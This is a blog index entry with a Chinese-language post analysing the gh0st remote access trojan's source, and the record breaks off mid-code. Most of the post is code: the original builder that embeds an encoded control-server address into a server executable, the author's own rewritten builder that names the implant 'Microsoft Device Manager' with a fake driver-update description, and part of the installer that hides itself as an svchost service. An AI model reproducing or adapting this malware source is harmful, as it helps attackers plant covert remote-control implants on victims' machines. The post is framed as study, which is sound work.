<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>gh0st源码分析</title>
      <link href="/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2025/10/08/gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>gh0st源码分析</p><span id="more"></span><h2 id="dEJeZ">流程理解</h2><p>客户端通过本地模板并写入信息生成服务端-install.exe 具体逻辑将提前放在.rdata中的dll取出，并注册服务在svchost下</p><p>dll的内容是删去install.exe并且自行隐藏，然后取出加密后的ip解密，向客户端发送随机事件名，响应后根据发来的包决定转接哪个Manager，如FIle，Screen等</p><h2 id="SX86Z">代码结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gh0st/</span><br><span class="line">├─gh0st/</span><br><span class="line">|   ├─gh0st.cpp #客户端的初始化</span><br><span class="line">|├─BuildView.cpp #读取Server文件，写入加密信息</span><br><span class="line">|└──SettingsView.cpp#ip和端口号的填写加密</span><br><span class="line">├─install/</span><br><span class="line">|└─install.cpp #运行时解密出需要的信息，取出svchost挂在服务下</span><br><span class="line">└─svchost/</span><br><span class="line"> ├─svchost.cpp #删除install，基本上就隐藏了，然后登录客户端，调用</span><br><span class="line">    |                  #KernelManager等待响应</span><br><span class="line"> ├─KernelManager.cpp#分发Manager的，比如Screen、Keyboard</span><br><span class="line"> ├─FileManager.cpp #接收客户端的信息进行文件操作</span><br><span class="line"> └─ScreenManager.cpp#接收客户端信息进行屏幕操作</span><br></pre></td></tr></table></figure><h2 id="ce3dE">源码分析</h2><h3 id="bILXS">客户端部分</h3>从模板install.exe中生成服务端exe<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBuildView::OnBuild</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line"><span class="built_in">UpdateData</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (m_ServiceDisplayName.<span class="built_in">IsEmpty</span>() || m_ServiceDescription.<span class="built_in">IsEmpty</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">AfxMessageBox</span>(<span class="string">&quot;请完整填写服务显示名称和描述 -:(&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">CString strAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存配置</span></span><br><span class="line">((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetString</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;DisplayName&quot;</span>, m_ServiceDisplayName);</span><br><span class="line">((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetString</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;Description&quot;</span>, m_ServiceDescription);</span><br><span class="line">((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetInt</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;enablehttp&quot;</span>, m_enable_http);</span><br><span class="line"><span class="keyword">if</span> (m_enable_http)</span><br><span class="line">&#123;</span><br><span class="line">CString str;</span><br><span class="line"><span class="built_in">GetDlgItemText</span>(IDC_URL, str);</span><br><span class="line">((CGh0stApp *)<span class="built_in">AfxGetApp</span>())-&gt;m_IniFile.<span class="built_in">SetString</span>(<span class="string">&quot;Build&quot;</span>, <span class="string">&quot;httpurl&quot;</span>, str);</span><br><span class="line">str.<span class="built_in">MakeLower</span>();</span><br><span class="line">strAddress = <span class="built_in">MyEncode</span>(str.<span class="built_in">GetBuffer</span>(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">GetDlgItemText</span>(IDC_DNS_STRING, strAddress);</span><br><span class="line">        <span class="comment">//读取格式为AAAA加密后的ipAAAA</span></span><br><span class="line"><span class="keyword">if</span> (strAddress.<span class="built_in">Find</span>(<span class="string">&quot;AAAA&quot;</span>) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">AfxMessageBox</span>(<span class="string">&quot;域名上线字串格式出错 -:(&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">strAddress.<span class="built_in">Replace</span>(<span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">CStringstrServiceConfig;</span><br><span class="line">strServiceConfig.<span class="built_in">Format</span>(<span class="string">&quot;%s|%s&quot;</span>, <span class="built_in">MyEncode</span>(m_ServiceDisplayName.<span class="built_in">GetBuffer</span>(<span class="number">0</span>)), </span><br><span class="line"><span class="built_in">MyEncode</span>(m_ServiceDescription.<span class="built_in">GetBuffer</span>(<span class="number">0</span>)));</span><br><span class="line">    </span><br><span class="line"><span class="function">CFileDialog <span class="title">dlg</span><span class="params">(FALSE, <span class="string">&quot;exe&quot;</span>, <span class="string">&quot;server.exe&quot;</span>, OFN_OVERWRITEPROMPT,<span class="string">&quot;可执行文件|*.exe&quot;</span>, <span class="literal">NULL</span>)</span></span>;</span><br><span class="line"><span class="keyword">if</span>(dlg.<span class="built_in">DoModal</span> () != IDOK)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">HINSTANCEhInstance;</span><br><span class="line">HRSRChResInfo;</span><br><span class="line">DWORDdwResLen;</span><br><span class="line">HGLOBALhResData;</span><br><span class="line">LPBYTElpData;</span><br><span class="line">hInstance = <span class="built_in">AfxGetApp</span>()-&gt;m_hInstance;</span><br><span class="line">hResInfo = <span class="built_in">FindResource</span>(hInstance, (LPCTSTR)IDR_BSS, (LPCTSTR)<span class="string">&quot;BSS&quot;</span>);</span><br><span class="line">dwResLen = <span class="built_in">SizeofResource</span>(hInstance, hResInfo);</span><br><span class="line">hResData = <span class="built_in">LoadResource</span>(hInstance, hResInfo);</span><br><span class="line">lpData = (LPBYTE)<span class="built_in">LockResource</span>(hResData);</span><br><span class="line"></span><br><span class="line">CFile file;</span><br><span class="line"><span class="keyword">if</span>(file.<span class="built_in">Open</span> (dlg.<span class="built_in">GetPathName</span>(), CFile::modeCreate | CFile::modeWrite))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">file.<span class="built_in">Write</span>(lpData, dwResLen);</span><br><span class="line"><span class="comment">// 写入6个&#x27;C&#x27;,是服务的名称和描述</span></span><br><span class="line">file.<span class="built_in">Write</span>(<span class="string">&quot;CCCCCC&quot;</span>, <span class="number">6</span>);</span><br><span class="line">file.<span class="built_in">Write</span>(strServiceConfig, strServiceConfig.<span class="built_in">GetLength</span>() + <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 写入6个&#x27;A&#x27;,安装时查找</span></span><br><span class="line">file.<span class="built_in">Write</span>(<span class="string">&quot;AAAAAA&quot;</span>, <span class="number">6</span>);</span><br><span class="line">file.<span class="built_in">Write</span>(strAddress, strAddress.<span class="built_in">GetLength</span>() + <span class="number">1</span>);</span><br><span class="line">file.<span class="built_in">Close</span>();</span><br><span class="line"><span class="built_in">AfxMessageBox</span>(<span class="string">&quot;文件保存成功，请用加壳软件进行压缩 -:)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(...)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="string">&quot;文件保存失败，请检查&quot;</span>,<span class="string">&quot;提示&quot;</span>,MB_OK|MB_ICONSTOP);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">FreeResource</span>(hResData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里每次改动dll或者install.exe的时候都要按照svchost-&gt;install-&gt;gh0st的顺序全部重新编译，所以自己复现了一个直接凭借install.exe生成目标文件的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> base64[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">base64_encode</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* data, <span class="type">int</span> size, <span class="type">char</span>** str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span>* s, * p;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* q;</span><br><span class="line"></span><br><span class="line">p = s = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size * <span class="number">4</span> / <span class="number">3</span> + <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">q = (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>*)data;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size;) &#123;</span><br><span class="line">c = q[i++];</span><br><span class="line">c *= <span class="number">256</span>;</span><br><span class="line"><span class="keyword">if</span> (i &lt; size)</span><br><span class="line">c += q[i];</span><br><span class="line">i++;</span><br><span class="line">c *= <span class="number">256</span>;</span><br><span class="line"><span class="keyword">if</span> (i &lt; size)</span><br><span class="line">c += q[i];</span><br><span class="line">i++;</span><br><span class="line">p[<span class="number">0</span>] = base64[(c &amp; <span class="number">0x00fc0000</span>) &gt;&gt; <span class="number">18</span>];</span><br><span class="line">p[<span class="number">1</span>] = base64[(c &amp; <span class="number">0x0003f000</span>) &gt;&gt; <span class="number">12</span>];</span><br><span class="line">p[<span class="number">2</span>] = base64[(c &amp; <span class="number">0x00000fc0</span>) &gt;&gt; <span class="number">6</span>];</span><br><span class="line">p[<span class="number">3</span>] = base64[(c &amp; <span class="number">0x0000003f</span>) &gt;&gt; <span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (i &gt; size)</span><br><span class="line">p[<span class="number">3</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (i &gt; size + <span class="number">1</span>)</span><br><span class="line">p[<span class="number">2</span>] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">p += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">*p = <span class="number">0</span>;</span><br><span class="line">*str = s;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">MyEncode</span><span class="params">(<span class="type">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span>i, len;</span><br><span class="line"><span class="type">char</span>* p;</span><br><span class="line"><span class="type">char</span>* s, * data;</span><br><span class="line">len = <span class="built_in">strlen</span>(str) + <span class="number">1</span>;</span><br><span class="line">s = (<span class="type">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line"><span class="built_in">memcpy</span>(s, str, len);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line">s[i] ^= <span class="number">0x19</span>;</span><br><span class="line">s[i] += <span class="number">0x86</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">base64_encode</span>(s, len, &amp;data);</span><br><span class="line"><span class="built_in">free</span>(s);</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">my_strstr</span><span class="params">(<span class="type">char</span>* a1, <span class="type">char</span>* a2, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">a1[i] = a2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"><span class="type">int</span> enablehttp = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> InputStr[<span class="number">100</span>];<span class="comment">//端口域名</span></span><br><span class="line"><span class="type">char</span>* EnInputStr;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, InputStr);</span><br><span class="line"><span class="comment">//printf(&quot;%s&quot;, MyEncode(InputStr));</span></span><br><span class="line">EnInputStr = <span class="built_in">MyEncode</span>(InputStr);</span><br><span class="line"><span class="type">char</span> strServiceConfig[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> DisplayName[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">sprintf_s</span>(DisplayName, <span class="string">&quot;Microsoft Device Manager_%02x&quot;</span>, <span class="built_in">rand</span>() % <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Description[] = <span class="string">&quot;监测和监视新硬件设备并自动更新设备驱动&quot;</span>;</span><br><span class="line"><span class="built_in">sprintf_s</span>(strServiceConfig, <span class="string">&quot;%s|%s&quot;</span>, <span class="built_in">MyEncode</span>(DisplayName),<span class="built_in">MyEncode</span>(Description));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str1[<span class="number">100</span>] = <span class="string">&quot;CCCCCC&quot;</span>;</span><br><span class="line"><span class="built_in">strcat</span>(str1, strServiceConfig);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> str2[<span class="number">100</span>] = <span class="string">&quot;AAAAAA&quot;</span>;</span><br><span class="line"><span class="built_in">strcat</span>(str2, EnInputStr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">char</span>* pfile = <span class="literal">NULL</span>;</span><br><span class="line">FILE* pf = <span class="literal">NULL</span>;</span><br><span class="line">ULONG_PTR size;</span><br><span class="line">ULONG_PTR read_size;</span><br><span class="line"><span class="built_in">fopen_s</span>(&amp;pf, <span class="string">&quot;E:\\study\\Trojan\\Gh0st-vs2019--main\\Gh0st-vs2019--main\\gh0st-vs2019\\gh0st\\res\\install.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pf == <span class="literal">NULL</span>) <span class="keyword">throw</span> <span class="string">&quot;[-]: fopen wrong&quot;</span>;</span><br><span class="line"><span class="built_in">fseek</span>(pf, <span class="number">0</span>, SEEK_END);</span><br><span class="line">size = <span class="built_in">ftell</span>(pf);</span><br><span class="line"><span class="built_in">fseek</span>(pf, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">pfile = (<span class="type">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> (pfile == <span class="literal">NULL</span>) <span class="keyword">throw</span> <span class="string">&quot;[-]: malloc wrong&quot;</span>;</span><br><span class="line">read_size = <span class="built_in">fread</span>(pfile, <span class="built_in">sizeof</span>(<span class="type">char</span>), size, pf);</span><br><span class="line"><span class="keyword">if</span> (read_size != size) <span class="keyword">throw</span> <span class="string">&quot;[-]: fread wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> pathname[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">sprintf_s</span>(pathname, <span class="string">&quot;E:\\study\\Trojan\\Gh0st-vs2019--main\\Gh0st-vs2019--main\\gh0st-vs2019\\gh0st\\Release\\server\\server_%02x.exe&quot;</span>, <span class="built_in">rand</span>() % <span class="number">0xff</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(pf);</span><br><span class="line">pf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">fopen_s</span>(&amp;pf, pathname, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pf == <span class="literal">NULL</span>) <span class="keyword">throw</span> <span class="string">&quot;[-]: fopen wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fwrite</span>(pfile, <span class="number">1</span>, size, pf);</span><br><span class="line"><span class="built_in">fwrite</span>(str1, <span class="number">1</span>, <span class="built_in">strlen</span>(str1) + <span class="number">1</span>, pf);</span><br><span class="line"><span class="built_in">fwrite</span>(str2, <span class="number">1</span>, <span class="built_in">strlen</span>(str2) + <span class="number">1</span>, pf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span> (<span class="type">const</span> <span class="type">char</span>* msg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">DWORD err = <span class="built_in">GetLastError</span>();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%08x&quot;</span>, err);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">catch</span>(...)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MSc7y">服务端部分</h3><h4 id="thIjT">install</h4>install的模板<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">__declspec(noinline)</span><br><span class="line"><span class="function"><span class="type">int</span> APIENTRY <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="params"><span class="function">                     LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="type">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 让启动程序时的小漏斗马上消失</span></span><br><span class="line"><span class="built_in">GetInputState</span>();</span><br><span class="line"><span class="built_in">PostThreadMessage</span>(<span class="built_in">GetCurrentThreadId</span>(),<span class="literal">NULL</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">MSGmsg;</span><br><span class="line"><span class="built_in">GetMessage</span>(&amp;msg, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line"><span class="type">char</span>*lpEncodeString = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span>*lpServiceConfig = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span>*lpServiceDisplayName = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span>*lpServiceDescription = <span class="literal">NULL</span>;</span><br><span class="line">lpEncodeString = (<span class="type">char</span> *)<span class="built_in">FindConfigString</span>(hInstance, <span class="string">&quot;AAAAAA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (lpEncodeString == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in FindConfigStringAAAAAA&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lpServiceConfig = (<span class="type">char</span> *)<span class="built_in">FindConfigString</span>(hInstance, <span class="string">&quot;CCCCCC&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (lpServiceConfig == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in FindConfigStringCCCCCC&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span>* pos = <span class="built_in">strchr</span>(lpServiceConfig, <span class="string">&#x27;|&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (pos == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Rrror in pos&quot;</span>, <span class="string">&quot;l1pmoluy&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">*pos = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">lpEncodeString = <span class="built_in">MyDecode</span>(lpEncodeString + <span class="number">6</span>);</span><br><span class="line">lpServiceDisplayName = <span class="built_in">MyDecode</span>(lpServiceConfig + <span class="number">6</span>);</span><br><span class="line">lpServiceDescription = <span class="built_in">MyDecode</span>(pos + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (lpServiceDisplayName == <span class="literal">NULL</span> || lpServiceDescription == <span class="literal">NULL</span> || lpEncodeString == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span 